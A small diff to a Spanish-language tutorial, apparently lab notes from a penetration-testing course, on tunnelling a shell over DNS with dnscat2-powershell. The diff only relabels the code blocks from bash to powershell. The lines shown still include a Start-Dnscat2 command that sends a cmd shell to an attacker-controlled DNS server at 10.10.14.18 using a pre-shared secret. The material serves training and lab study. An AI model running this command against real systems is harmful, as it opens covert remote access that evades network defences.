@@ -31,13 +31,13 @@ El servidor, nos proporcionará la clave secreta, que tendremos que proporcionar
 
 ### 1. Clonación de dnscat-powershell
 
-```bash
+```powershell
 git clone https://github.com/lukebaggett/dnscat2-powershell.git
 ```
 
 ### 2. Importando dnscat
 
-```bash
+```powershell
 Import-Module .\dnscat2.ps1
 ```
 
@@ -45,6 +45,6 @@ Una vez importado dnscat2.ps1, podemos usarlo para establecer un túnel con el s
 
 ### 3. Enviar shell a nuestro servidor
 
-```bash
+```powershell
 Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd
 ```
